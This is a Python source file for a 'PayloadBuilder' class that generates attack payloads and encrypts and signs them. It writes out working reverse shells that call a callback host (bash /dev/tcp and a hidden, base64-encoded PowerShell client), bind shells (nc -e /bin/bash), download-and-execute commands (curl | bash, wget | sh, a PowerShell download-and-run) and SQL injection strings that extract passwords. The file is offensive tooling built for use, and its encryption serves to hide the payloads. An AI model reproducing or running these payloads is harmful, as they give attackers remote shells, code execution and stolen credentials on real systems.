import logging
import base64
import os
import json
import hmac
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac as crypto_hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import secrets

logger = logging.getLogger(__name__)

class PayloadBuilder:
    def __init__(self, master_key: bytes = None):
        self.backend = default_backend()
        if master_key is None:
            master_key = os.environ.get('PAYLOAD_MASTER_KEY', secrets.token_bytes(32))
            if isinstance(master_key, str):
                master_key = base64.b64decode(master_key)
        self.master_key = master_key
        self.salt = os.environ.get('PAYLOAD_SALT', secrets.token_hex(16)).encode()
        logger.info("PayloadBuilder initialized")

    def _derive_key(self, context: str) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt + context.encode(),
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(self.master_key)

    def _encrypt_payload(self, payload: bytes, context: str) -> bytes:
        key = self._derive_key(context)
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        ct = encryptor.update(payload) + encryptor.finalize()
        return iv + encryptor.tag + ct

    def _sign_payload(self, payload: bytes, context: str) -> str:
        key = self._derive_key("sign_" + context)
        h = crypto_hmac.HMAC(key, hashes.SHA256(), backend=self.backend)
        h.update(payload)
        return base64.b64encode(h.finalize()).decode()

    def build_reverse_shell(self, target_os: str, callback_ip: str, callback_port: int, use_ssl: bool = False) -> dict:
        """Generate a reverse shell payload (obfuscated and encrypted)."""
        if target_os == "linux":
            raw = f"bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'"
        elif target_os == "windows":
            ps_cmd = f"$c=New-Object System.Net.Sockets.TCPClient('{callback_ip}',{callback_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
            raw = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64.b64encode(ps_cmd.encode('utf-16le')).decode()}"
        else:
            raw = f"echo 'Unsupported OS: {target_os}'"
        context = f"reverse_shell_{target_os}_{callback_ip}_{callback_port}"
        encrypted = self._encrypt_payload(raw.encode(), context)
        signature = self._sign_payload(encrypted, context)
        return {
            "payload_type": "reverse_shell",
            "target_os": target_os,
            "callback": f"{callback_ip}:{callback_port}",
            "encrypted": base64.b64encode(encrypted).decode(),
            "signature": signature,
            "use_ssl": use_ssl
        }

    def build_bind_shell(self, target_os: str, bind_port: int) -> dict:
        """Generate a bind shell payload."""
        if target_os == "linux":
            raw = f"nc -lvp {bind_port} -e /bin/bash"
        elif target_os == "windows":
            raw = f"powershell -Command \"$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{bind_port});$l.Start();$c = $l.AcceptTcpClient();$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b,0,$b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close();$l.Stop()\""
        else:
            raw = f"echo 'Unsupported OS: {target_os}'"
        context = f"bind_shell_{target_os}_{bind_port}"
        encrypted = self._encrypt_payload(raw.encode(), context)
        signature = self._sign_payload(encrypted, context)
        return {
            "payload_type": "bind_shell",
            "target_os": target_os,
            "port": bind_port,
            "encrypted": base64.b64encode(encrypted).decode(),
            "signature": signature
        }

    def build_download_exec(self, url: str, target_os: str = "any") -> dict:
        """Generate a download & execute payload."""
        if target_os == "linux":
            raw = f"curl -s {url} | bash"
        elif target_os == "windows":
            raw = f"powershell -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '%TEMP%\\downloaded.exe'; Start-Process '%TEMP%\\downloaded.exe'\""
        else:
            raw = f"wget -qO- {url} | sh"
        context = f"download_exec_{target_os}_{hash(url)}"
        encrypted = self._encrypt_payload(raw.encode(), context)
        signature = self._sign_payload(encrypted, context)
        return {
            "payload_type": "download_exec",
            "url": url,
            "target_os": target_os,
            "encrypted": base64.b64encode(encrypted).decode(),
            "signature": signature
        }

    def build_sql_injection(self, db_type: str, target_table: str = "users") -> dict:
        """Generate a generic SQL injection payload."""
        if db_type == "mysql":
            raw = f"UNION SELECT null, username, password FROM {target_table}"
        elif db_type == "postgresql":
            raw = f"UNION SELECT NULL, usename, passwd FROM pg_shadow"
        else:
            raw = f"UNION SELECT 1,2,3--"
        context = f"sql_injection_{db_type}_{target_table}"
        encrypted = self._encrypt_payload(raw.encode(), context)
        signature = self._sign_payload(encrypted, context)
        return {
            "payload_type": "sql_injection",
            "db_type": db_type,
            "target_table": target_table,
            "encrypted": base64.b64encode(encrypted).decode(),
            "signature": signature
        }

    def decode_payload(self, encrypted_b64: str, signature: str, context: str) -> bytes:
        """Verify signature and decrypt payload."""
        encrypted = base64.b64decode(encrypted_b64)
        expected_sig = self._sign_payload(encrypted, context)
        if not hmac.compare_digest(expected_sig, signature):
            raise ValueError("Invalid signature")
        key = self._derive_key(context)
        iv = encrypted[:12]
        tag = encrypted[12:28]
        ct = encrypted[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=self.backend)
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()

# Example usage (commented out for production)
# if __name__ == "__main__":
#     pb = PayloadBuilder()
#     rev = pb.build_reverse_shell("linux", "10.0.0.1", 4444)
#     print(json.dumps(rev, indent=2))
#     plain = pb.decode_payload(rev["encrypted"], rev["signature"], f"reverse_shell_linux_10.0.0.1_4444")
#     print("Decrypted:", plain.decode())